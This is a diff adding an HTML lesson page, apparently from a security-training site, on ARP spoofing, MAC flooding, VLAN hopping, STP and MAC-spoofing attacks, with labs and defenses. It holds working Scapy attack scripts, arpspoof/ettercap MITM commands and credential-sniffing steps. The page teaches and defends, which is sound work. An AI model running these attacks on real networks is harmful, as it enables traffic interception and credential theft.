@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | ARP &amp; Layer 2</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>ARP &amp; Layer 2 Attacks</h1>
+    <hr>
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- ==================== NOTES TAB ==================== -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ARP Protocol -->
+        <h2>ARP Protocol</h2>
+        <p>ARP (Address Resolution Protocol) maps IPv4 addresses to MAC addresses on a local network segment. It operates at Layer 2 and is <strong>stateless</strong> — hosts accept ARP replies even without sending a request, which is the root of most ARP attacks.</p>
+
+        <h3>How ARP Works</h3>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr><th>Step</th><th>Type</th><th>Dst MAC</th><th>Description</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>1</td><td>ARP Request</td><td><code>ff:ff:ff:ff:ff:ff</code> (broadcast)</td><td>"Who has 192.168.1.1? Tell 192.168.1.100"</td></tr>
+            <tr><td>2</td><td>ARP Reply</td><td>Requester's MAC (unicast)</td><td>"192.168.1.1 is at aa:bb:cc:dd:ee:ff"</td></tr>
+            <tr><td>3</td><td>Cache update</td><td>—</td><td>Requester stores mapping in ARP table</td></tr>
+          </tbody>
+        </table>
+
+        <h3>ARP Packet Structure</h3>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr><th>Field</th><th>Size</th><th>Description</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Hardware Type</td><td>2 bytes</td><td>1 = Ethernet</td></tr>
+            <tr><td>Protocol Type</td><td>2 bytes</td><td>0x0800 = IPv4</td></tr>
+            <tr><td>Hardware Size</td><td>1 byte</td><td>6 (MAC address length)</td></tr>
+            <tr><td>Protocol Size</td><td>1 byte</td><td>4 (IPv4 address length)</td></tr>
+            <tr><td>Opcode</td><td>2 bytes</td><td>1 = Request, 2 = Reply</td></tr>
+            <tr><td>Sender MAC</td><td>6 bytes</td><td>Source hardware address</td></tr>
+            <tr><td>Sender IP</td><td>4 bytes</td><td>Source protocol address</td></tr>
+            <tr><td>Target MAC</td><td>6 bytes</td><td>Destination hardware address</td></tr>
+            <tr><td>Target IP</td><td>4 bytes</td><td>Destination protocol address</td></tr>
+          </tbody>
+        </table>
+
+        <h3>ARP Table</h3>
+<pre><code class="language-bash"># View ARP table
+arp -a                          # all platforms
+ip neigh show                   # Linux (modern)
+arp -n                          # Linux (numeric, no DNS)
+
+# Add static entry
+sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
+sudo ip neigh add 192.168.1.1 lladdr aa:bb:cc:dd:ee:ff dev eth0
+
+# Delete entry
+sudo arp -d 192.168.1.1
+sudo ip neigh del 192.168.1.1 dev eth0
+
+# Flush entire ARP cache
+sudo ip neigh flush all</code></pre>
+
+        <!-- ARP Spoofing -->
+        <h2>ARP Spoofing / Poisoning</h2>
+        <p>Send fake ARP replies to associate your MAC address with another host's IP (usually the gateway). Victims send traffic to you instead of the real gateway, enabling MITM.</p>
+
+        <h3>arpspoof (dsniff)</h3>
+<pre><code class="language-bash"># Enable IP forwarding (so traffic still reaches its destination)
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# Poison victim's ARP cache — tell victim YOU are the gateway
+sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+
+# Poison gateway's ARP cache — tell gateway YOU are the victim
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
+
+# Run both in separate terminals for full bidirectional MITM</code></pre>
+
+        <h3>Ettercap</h3>
+<pre><code class="language-bash"># Text mode — ARP poisoning between target and gateway
+sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//
+
+# GUI mode
+sudo ettercap -G
+
+# Scan for hosts on the network
+sudo ettercap -T -q -i eth0 <<<'l'   # list hosts after scan
+
+# With DNS spoofing plugin
+sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.1.100// /192.168.1.1//</code></pre>
+
+        <h3>Scapy — Custom ARP Packets</h3>
+<pre><code class="language-python">from scapy.all import *
+
+# Craft ARP reply: tell victim (192.168.1.100) that gateway (192.168.1.1)
+# is at YOUR MAC address
+target_ip = "192.168.1.100"
+gateway_ip = "192.168.1.1"
+target_mac = getmacbyip(target_ip)
+
+# op=2 means ARP reply
+# pdst = victim IP, hwdst = victim MAC
+# psrc = IP we're impersonating (gateway)
+# hwsrc defaults to our MAC
+packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+
+# Send continuously
+while True:
+    send(packet, verbose=False)
+    time.sleep(2)</code></pre>
+
+<pre><code class="language-python"># Full bidirectional ARP spoof script
+from scapy.all import *
+import time, sys
+
+def get_mac(ip):
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
+    if ans:
+        return ans[0][1].hwsrc
+    return None
+
+def spoof(target_ip, spoof_ip, target_mac):
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, verbose=False)
+
+def restore(target_ip, gateway_ip, target_mac, gateway_mac):
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                 psrc=gateway_ip, hwsrc=gateway_mac)
+    send(packet, count=4, verbose=False)
+
+target_ip = sys.argv[1]
+gateway_ip = sys.argv[2]
+target_mac = get_mac(target_ip)
+gateway_mac = get_mac(gateway_ip)
+
+print(f"[*] Target  {target_ip} is at {target_mac}")
+print(f"[*] Gateway {gateway_ip} is at {gateway_mac}")
+
+try:
+    sent = 0
+    while True:
+        spoof(target_ip, gateway_ip, target_mac)
+        spoof(gateway_ip, target_ip, gateway_mac)
+        sent += 2
+        print(f"\r[*] Packets sent: {sent}", end="")
+        time.sleep(1)
+except KeyboardInterrupt:
+    print("\n[*] Restoring ARP tables...")
+    restore(target_ip, gateway_ip, target_mac, gateway_mac)
+    restore(gateway_ip, target_ip, gateway_mac, target_mac)
+    print("[+] ARP tables restored.")</code></pre>
+
+        <!-- MITM via ARP -->
+        <h2>MITM via ARP</h2>
+        <p>Once ARP poisoning is active, intercept traffic with these tools:</p>
+<pre><code class="language-bash"># Capture all traffic from victim
+sudo tcpdump -i eth0 -w capture.pcap host 192.168.1.100
+
+# Sniff HTTP credentials (cleartext)
+sudo dsniff -i eth0
+
+# Sniff URLs being visited
+sudo urlsnarf -i eth0
+
+# Sniff images from HTTP traffic
+sudo driftnet -i eth0
+
+# SSLstrip — downgrade HTTPS to HTTP (legacy, blocked by HSTS)
+sudo sslstrip -l 8080
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+
+# mitmproxy — interactive HTTPS interception
+mitmproxy -T --host</code></pre>
+
+        <!-- MAC Flooding -->
+        <h2>MAC Flooding</h2>
+        <p>Overflows the switch's CAM (Content Addressable Memory) table with random MAC addresses. When the table is full, the switch falls back to <strong>hub mode</strong> — broadcasting all frames to all ports, allowing passive sniffing.</p>
+<pre><code class="language-bash"># macof (part of dsniff) — flood with random MAC addresses
+sudo macof -i eth0
+
+# Limit to specific count
+sudo macof -i eth0 -n 100000</code></pre>
+<pre><code class="language-python"># Scapy MAC flood
+from scapy.all import *
+
+while True:
+    packet = Ether(src=RandMAC(), dst=RandMAC()) / \
+             IP(src=RandIP(), dst=RandIP()) / \
+             ICMP()
+    sendp(packet, iface="eth0", verbose=False)</code></pre>
+
+        <!-- VLAN Hopping -->
+        <h2>VLAN Hopping</h2>
+        <p>VLANs (802.1Q) segment Layer 2 traffic. VLAN hopping attacks let you reach hosts in VLANs you shouldn't have access to.</p>
+
+        <h3>Switch Spoofing</h3>
+        <p>Negotiate a trunk link with the switch by pretending to be another switch using DTP (Dynamic Trunking Protocol). Once trunked, you receive traffic from all VLANs.</p>
+<pre><code class="language-bash"># Yersinia — DTP attack to negotiate trunk
+sudo yersinia dtp -attack 1 -interface eth0
+
+# Verify trunk was established
+sudo tcpdump -i eth0 -e | grep 802.1Q</code></pre>
+
+        <h3>Double Tagging</h3>
+        <p>Encapsulate frames with two 802.1Q tags. The first tag (native VLAN) is stripped by the first switch, and the inner tag routes the frame to the target VLAN. <strong>One-way only</strong> — no return traffic.</p>
+<pre><code class="language-python"># Scapy double-tagged frame
+from scapy.all import *
+
+# Outer tag = native VLAN (e.g., VLAN 1), Inner tag = target VLAN (e.g., VLAN 100)
+frame = Ether(dst="ff:ff:ff:ff:ff:ff") / \
+        Dot1Q(vlan=1) / \
+        Dot1Q(vlan=100) / \
+        IP(dst="192.168.100.1") / \
+        ICMP()
+
+sendp(frame, iface="eth0")</code></pre>
+
+        <!-- STP Attacks -->
+        <h2>STP Attacks</h2>
+        <p>Spanning Tree Protocol (STP) prevents Layer 2 loops by electing a root bridge. By injecting BPDUs with a lower bridge priority, you can become the root bridge and redirect all traffic through your machine.</p>
+<pre><code class="language-bash"># Yersinia — STP root bridge takeover
+sudo yersinia stp -attack 4 -interface eth0
+
+# STP DoS — flood with BPDUs to cause topology changes
+sudo yersinia stp -attack 2 -interface eth0</code></pre>
+<pre><code class="language-python"># Scapy — send BPDU with lowest priority to become root
+from scapy.all import *
+
+bpdu = Dot3(dst="01:80:c2:00:00:00", src=get_if_hwaddr("eth0")) / \
+       LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
+       STP(bpdutype=0x00, rootid=0, rootmac=get_if_hwaddr("eth0"),
+           bridgeid=0, bridgemac=get_if_hwaddr("eth0"))
+
+sendp(bpdu, iface="eth0", loop=1, inter=2)</code></pre>
+
+        <!-- MAC Address Spoofing -->
+        <h2>MAC Address Spoofing</h2>
+        <p>Change your interface's MAC address to bypass MAC-based access controls, impersonate another device, or maintain anonymity on a LAN.</p>
+<pre><code class="language-bash"># Linux — manual
+sudo ip link set eth0 down
+sudo ip link set eth0 address aa:bb:cc:dd:ee:ff
+sudo ip link set eth0 up
+
+# Linux — macchanger
+sudo macchanger -r eth0          # random MAC
+sudo macchanger -m aa:bb:cc:dd:ee:ff eth0   # specific MAC
+sudo macchanger -p eth0          # restore original
+
+# Show current MAC
+ip link show eth0
+macchanger -s eth0
+
+# Windows (PowerShell)
+Set-NetAdapter -Name "Ethernet" -MacAddress "AA-BB-CC-DD-EE-FF"
+
+# Temporarily randomize MAC before connecting
+sudo ip link set eth0 down
+sudo macchanger -r eth0
+sudo ip link set eth0 up
+sudo dhclient eth0</code></pre>
+
+        <!-- Defense -->
+        <h2>Defense &amp; Mitigation</h2>
+
+        <h3>Dynamic ARP Inspection (DAI)</h3>
+        <p>Validates ARP packets against the DHCP snooping binding table. Drops ARP replies that don't match known IP-to-MAC mappings.</p>
+<pre><code class="language-bash"># Cisco IOS — enable DAI on a VLAN
+ip arp inspection vlan 10,20
+
+# Trust uplink ports (to other switches/routers)
+interface GigabitEthernet0/1
+  ip arp inspection trust
+
+# Rate-limit ARP on untrusted ports (prevent DoS)
+interface GigabitEthernet0/2
+  ip arp inspection limit rate 15</code></pre>
+
+        <h3>Port Security</h3>
+        <p>Limits the number of MAC addresses per switch port. Prevents MAC flooding and unauthorized device connections.</p>
+<pre><code class="language-bash"># Cisco IOS — enable port security
+interface GigabitEthernet0/2
+  switchport mode access
+  switchport port-security
+  switchport port-security maximum 2
+  switchport port-security violation shutdown    # shutdown | restrict | protect
+  switchport port-security mac-address sticky    # learn and lock MACs</code></pre>
+
+        <h3>Static ARP Entries</h3>
+<pre><code class="language-bash"># Linux — add static entries for critical hosts (gateway, DNS)
+sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
+
+# Windows
+netsh interface ip add neighbors "Ethernet" 192.168.1.1 aa-bb-cc-dd-ee-ff</code></pre>
+
+        <h3>DHCP Snooping</h3>
+<pre><code class="language-bash"># Cisco IOS — prerequisite for DAI
+ip dhcp snooping
+ip dhcp snooping vlan 10,20
+
+interface GigabitEthernet0/1
+  ip dhcp snooping trust      # uplink to DHCP server</code></pre>
+
+        <h3>Other Mitigations</h3>
+        <table class="table table-dark table-bordered table-striped">
+          <thead>
+            <tr><th>Attack</th><th>Defense</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>ARP Spoofing</td><td>DAI, static ARP entries, ARP monitoring tools (arpwatch, XArp)</td></tr>
+            <tr><td>MAC Flooding</td><td>Port security (limit MACs per port)</td></tr>
+            <tr><td>VLAN Hopping (DTP)</td><td>Disable DTP: <code>switchport nonegotiate</code>, set ports to access mode</td></tr>
+            <tr><td>VLAN Hopping (Double Tag)</td><td>Don't use native VLAN 1, tag native VLAN traffic</td></tr>
+            <tr><td>STP Attack</td><td>BPDU Guard: <code>spanning-tree bpduguard enable</code>, Root Guard</td></tr>
+            <tr><td>MAC Spoofing</td><td>802.1X (port-based NAC), port security with sticky MACs</td></tr>
+          </tbody>
+        </table>
+
+        <h3>Detection</h3>
+<pre><code class="language-bash"># arpwatch — monitor ARP activity, alert on changes
+sudo arpwatch -i eth0
+
+# Detect duplicate IPs (sign of ARP spoofing)
+sudo arping -D -I eth0 192.168.1.1
+
+# Check for multiple MACs claiming same IP
+arp -a | sort -t'(' -k2 | uniq -d -f1
+
+# Wireshark filter for ARP anomalies
+# Display filter: arp.duplicate-address-detected
+# or: arp.opcode == 2   (show all ARP replies)</code></pre>
+
+      </div>
+
+      <!-- ==================== LAB TAB ==================== -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: ARP Table Exploration &amp; Scapy Packets</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Examine the ARP table on your machine, send ARP requests with scapy, and observe how the ARP cache gets populated.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong> Any Linux machine on a local network with at least one other host reachable. Install scapy: <code>pip install scapy</code>.</p>
+<pre><code class="language-bash"># Step 1: View your current ARP table
+arp -a
+ip neigh show
+
+# Step 2: Flush the ARP cache and observe re-population
+sudo ip neigh flush all
+ping -c 1 192.168.1.1
+ip neigh show     # gateway MAC should reappear</code></pre>
+<pre><code class="language-python"># Step 3: Send ARP request with scapy
+from scapy.all import *
+
+# Who has 192.168.1.1? (ARP request via broadcast)
+ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
+                 ARP(pdst="192.168.1.1"),
+                 timeout=2, verbose=True)
+
+for snd, rcv in ans:
+    print(f"{rcv.psrc} is at {rcv.hwsrc}")
+
+# Step 4: Scan entire subnet for live hosts
+ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
+                 ARP(pdst="192.168.1.0/24"),
+                 timeout=2, verbose=False)
+
+print("\nLive hosts:")
+for snd, rcv in ans:
+    print(f"  {rcv.psrc:15s} → {rcv.hwsrc}")</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Compare <code>arp -a</code> output before and after pinging a new host</li>
+              <li>Use scapy to resolve the MAC of every host on your /24 subnet</li>
+              <li>Send a gratuitous ARP (ARP reply with your own IP) and check if other hosts update their cache</li>
+              <li>Capture the ARP exchange in Wireshark — identify request vs reply</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: ARP Spoofing MITM</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Perform a full ARP spoofing MITM attack between a victim and the gateway. Intercept HTTP traffic and observe credentials in cleartext.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong> Two VMs on same network segment — attacker (Kali) and victim (any Linux/Windows). A gateway/router. Victim should browse an HTTP (not HTTPS) site.</p>
+<pre><code class="language-bash"># Attacker — Step 1: Enable IP forwarding
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# Step 2: Start ARP spoofing (two terminals)
+# Terminal 1: Tell victim YOU are the gateway
+sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
+
+# Terminal 2: Tell gateway YOU are the victim
+sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
+
+# Step 3: Capture traffic
+sudo tcpdump -i eth0 -w mitm_capture.pcap host 192.168.1.100
+
+# Step 4: Sniff credentials
+sudo dsniff -i eth0
+
+# Alternative: use ettercap (all-in-one)
+sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.100// /192.168.1.1//</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Verify the victim's ARP table before and during the attack — confirm the gateway MAC changed</li>
+              <li>On the victim, browse to an HTTP login page and submit credentials</li>
+              <li>On the attacker, confirm you captured the credentials with dsniff or Wireshark</li>
+              <li>Stop the attack and verify ARP tables restore correctly</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: VLAN Hopping</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit misconfigured switch DTP settings to negotiate a trunk link, then access hosts on a different VLAN. Alternatively, perform a double-tagging attack.</p>
+          <div class="setup-code">
+            <p><strong>Setup:</strong> GNS3 or EVE-NG lab with a Cisco switch. Two VLANs (10 and 20). Attacker on VLAN 10, target on VLAN 20. Switch port set to <code>dynamic desirable</code> or <code>dynamic auto</code>.</p>
+<pre><code class="language-bash"># Method 1: DTP trunk negotiation with Yersinia
+sudo yersinia dtp -attack 1 -interface eth0
+
+# Verify trunk is up — should see 802.1Q tagged frames
+sudo tcpdump -i eth0 -e | grep 802.1Q
+
+# Create sub-interface for target VLAN
+sudo modprobe 8021q
+sudo ip link add link eth0 name eth0.20 type vlan id 20
+sudo ip addr add 192.168.20.50/24 dev eth0.20
+sudo ip link set eth0.20 up
+
+# Now ping / access hosts on VLAN 20
+ping 192.168.20.1</code></pre>
+<pre><code class="language-python"># Method 2: Double tagging with scapy
+from scapy.all import *
+
+# Outer tag = native VLAN (1), stripped by first switch
+# Inner tag = target VLAN (20)
+frame = Ether(dst="ff:ff:ff:ff:ff:ff") / \
+        Dot1Q(vlan=1) / \
+        Dot1Q(vlan=20) / \
+        IP(dst="192.168.20.1") / \
+        ICMP()
+
+sendp(frame, iface="eth0", count=5)
+print("[*] Double-tagged frames sent")</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Confirm initial VLAN isolation — verify you cannot reach VLAN 20 hosts</li>
+              <li>Use Yersinia to negotiate a trunk and verify with <code>tcpdump</code></li>
+              <li>Create a VLAN sub-interface and access the target VLAN</li>
+              <li>Apply the fix: set the port to <code>switchport mode access</code> + <code>switchport nonegotiate</code> and verify the attack fails</li>
+              <li>Test the double-tagging method and note its one-way limitation</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Gratuitous ARP</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Send gratuitous ARP announcements and observe how hosts on the network update their ARP caches without requesting it.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+
+my_ip = "192.168.1.50"
+my_mac = get_if_hwaddr("eth0")
+
+# Gratuitous ARP: announce our own IP → MAC mapping
+# Opcode 2 (reply), broadcast, sender = us
+garp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+    op=2,
+    psrc=my_ip, hwsrc=my_mac,
+    pdst=my_ip, hwdst="ff:ff:ff:ff:ff:ff"
+)
+sendp(garp, iface="eth0", count=3, inter=1)
+print(f"[+] Sent gratuitous ARP: {my_ip} is at {my_mac}")</code></pre>
+<pre><code class="language-bash"># Verify: check ARP tables on other hosts
+# On another machine:
+arp -a | grep 192.168.1.50
+
+# Use case: IP failover — new server announces it now owns the VIP
+# Use case: Attack — announce gateway IP with your MAC</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: ARP Cache Manipulation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Add, modify, and delete ARP entries. Understand static vs dynamic entries and their security implications.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># View current cache
+ip neigh show
+
+# Add static entry (immune to ARP spoofing for this IP)
+sudo ip neigh add 192.168.1.1 lladdr aa:bb:cc:dd:ee:ff dev eth0 nud permanent
+# Verify
+ip neigh show 192.168.1.1
+
+# Replace a dynamic entry
+sudo ip neigh replace 192.168.1.1 lladdr 11:22:33:44:55:66 dev eth0
+
+# Delete an entry
+sudo ip neigh del 192.168.1.1 dev eth0
+
+# Flush all dynamic entries
+sudo ip neigh flush all
+
+# Monitor ARP changes in real-time
+ip monitor neigh</code></pre>
+<pre><code class="language-python"># Script to lock down ARP table with static entries
+from scapy.all import *
+import subprocess
+
+# Discover all hosts and pin their MACs
+ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),
+             timeout=3, verbose=0)
+
+for snd, rcv in ans:
+    ip, mac = rcv.psrc, rcv.hwsrc
+    subprocess.run(["ip", "neigh", "replace", ip, "lladdr", mac,
+                    "dev", "eth0", "nud", "permanent"], check=True)
+    print(f"[+] Pinned {ip} → {mac}")</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Network Gateway Detection</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Identify the default gateway using ARP and routing table analysis. Detect if the gateway MAC has changed (potential spoofing).</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+import subprocess
+
+# Get gateway IP from routing table
+gw_ip = conf.route.route("0.0.0.0")[2]
+print(f"[+] Default gateway: {gw_ip}")
+
+# Get gateway MAC via ARP
+ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw_ip),
+             timeout=2, verbose=0)
+if ans:
+    gw_mac = ans[0][1].hwsrc
+    print(f"[+] Gateway MAC: {gw_mac}")
+
+    # Store known-good MAC and monitor for changes
+    def detect_spoof(pkt):
+        if pkt.haslayer(ARP) and pkt[ARP].psrc == gw_ip:
+            if pkt[ARP].hwsrc != gw_mac:
+                print(f"[!!!] ALERT: Gateway MAC changed! "
+                      f"{gw_mac} → {pkt[ARP].hwsrc}")
+                print(f"      Possible ARP spoofing attack!")
+
+    print(f"[*] Monitoring gateway ARP... (Ctrl+C to stop)")
+    sniff(filter="arp", prn=detect_spoof, store=0)</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Scapy ARP Monitor</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Build a real-time ARP monitor that detects new hosts, ARP storms, and potential spoofing attacks on the network.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+from collections import defaultdict
+import time
+
+arp_table = {}
+arp_counts = defaultdict(int)
+STORM_THRESHOLD = 50  # packets per 10 seconds
+
+def arp_monitor(pkt):
+    if not pkt.haslayer(ARP):
+        return
+
+    src_ip = pkt[ARP].psrc
+    src_mac = pkt[ARP].hwsrc
+    op = "REQUEST" if pkt[ARP].op == 1 else "REPLY"
+
+    # Track ARP rate (storm detection)
+    arp_counts[src_mac] += 1
+
+    # New host detection
+    if src_ip not in arp_table:
+        print(f"[NEW HOST] {src_ip} at {src_mac}")
+        arp_table[src_ip] = src_mac
+    elif arp_table[src_ip] != src_mac:
+        print(f"[!!! SPOOF] {src_ip} MAC changed: "
+              f"{arp_table[src_ip]} → {src_mac}")
+
+    # Storm detection
+    if arp_counts[src_mac] > STORM_THRESHOLD:
+        print(f"[STORM] {src_mac} sent {arp_counts[src_mac]} ARP packets!")
+
+print("[*] ARP Monitor running...")
+sniff(filter="arp", prn=arp_monitor, store=0)</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: MAC Spoofing</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Change your MAC address to impersonate another device. Bypass MAC-based access controls and test port security.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Method 1: ip/ifconfig
+sudo ip link set eth0 down
+sudo ip link set eth0 address aa:bb:cc:dd:ee:ff
+sudo ip link set eth0 up
+ip link show eth0
+
+# Method 2: macchanger
+sudo apt install macchanger
+sudo macchanger -s eth0                        # show current
+sudo macchanger -r eth0                        # random MAC
+sudo macchanger -m aa:bb:cc:dd:ee:ff eth0      # specific MAC
+sudo macchanger -p eth0                        # restore permanent
+
+# Bypass scenario: clone a whitelisted device's MAC
+# Step 1: Find target MAC on the network
+sudo nmap -sn 192.168.1.0/24 | grep -B2 "printer\|camera"
+# Step 2: Clone their MAC (they must be offline)
+sudo macchanger -m TARGET_MAC eth0
+# Step 3: Request DHCP lease
+sudo dhclient eth0</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: ARP Reply Crafting</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Craft targeted ARP replies to update a specific host's ARP cache. Understand unicast vs broadcast replies.</p>
+          <div class="setup-code">
+<pre><code class="language-python">from scapy.all import *
+
+victim_ip = "192.168.1.100"
+victim_mac = "aa:bb:cc:dd:ee:ff"  # get from ARP scan
+spoofed_ip = "192.168.1.1"  # gateway
+my_mac = get_if_hwaddr("eth0")
+
+# Targeted unicast ARP reply (stealthier)
+unicast_reply = Ether(dst=victim_mac) / ARP(
+    op=2,
+    psrc=spoofed_ip,
+    hwsrc=my_mac,
+    pdst=victim_ip,
+    hwdst=victim_mac
+)
+
+# Broadcast ARP reply (affects all hosts)
+broadcast_reply = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+    op=2,
+    psrc=spoofed_ip,
+    hwsrc=my_mac,
+    pdst=victim_ip,
+    hwdst="ff:ff:ff:ff:ff:ff"
+)
+
+# Send targeted reply (less noisy)
+sendp(unicast_reply, iface="eth0", count=5, inter=2)
+
+# Compare: observe traffic with tcpdump
+# Unicast only goes to victim; broadcast goes to everyone</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: Dynamic ARP Inspection (DAI) Configuration</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Configure Dynamic ARP Inspection on a Cisco switch to prevent ARP spoofing attacks. Test that spoofing is blocked.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Cisco switch configuration (GNS3/EVE-NG lab)
+
+# Step 1: Enable DHCP snooping (required for DAI)
+conf t
+ip dhcp snooping
+ip dhcp snooping vlan 10
+interface GigabitEthernet0/1
+  ip dhcp snooping trust          ! uplink to DHCP server
+exit
+
+# Step 2: Enable DAI
+ip arp inspection vlan 10
+interface GigabitEthernet0/2
+  ip arp inspection trust         ! trusted uplink
+exit
+# All other ports are untrusted (default)
+
+# Step 3: Verify
+show ip dhcp snooping binding    ! shows valid IP-MAC bindings
+show ip arp inspection statistics
+
+# Step 4: Test — run ARP spoof from untrusted port
+# On attacker: sudo arpspoof -i eth0 -t victim_ip gateway_ip
+# Should see drops in DAI statistics:
+show ip arp inspection statistics vlan 10</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Port Security Testing</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Configure and test switch port security to limit MAC addresses per port and observe what happens when violations occur.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Cisco switch port security configuration
+conf t
+interface GigabitEthernet0/3
+  switchport mode access
+  switchport port-security
+  switchport port-security maximum 2
+  switchport port-security violation restrict    ! or shutdown/protect
+  switchport port-security mac-address sticky
+exit
+
+# Verify
+show port-security interface Gi0/3
+show port-security address
+
+# Test: generate traffic from multiple MACs
+# On attacker machine, rapidly change MAC and send frames</code></pre>
+<pre><code class="language-python"># Port security tester — send frames with random MACs
+from scapy.all import *
+import random
+
+def random_mac():
+    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
+
+for i in range(10):
+    mac = random_mac()
+    pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.1")
+    sendp(pkt, iface="eth0", verbose=0)
+    print(f"[{i}] Sent frame from {mac}")
+
+# Check switch: show port-security interface Gi0/3
+# Should show violations and possibly err-disabled port</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
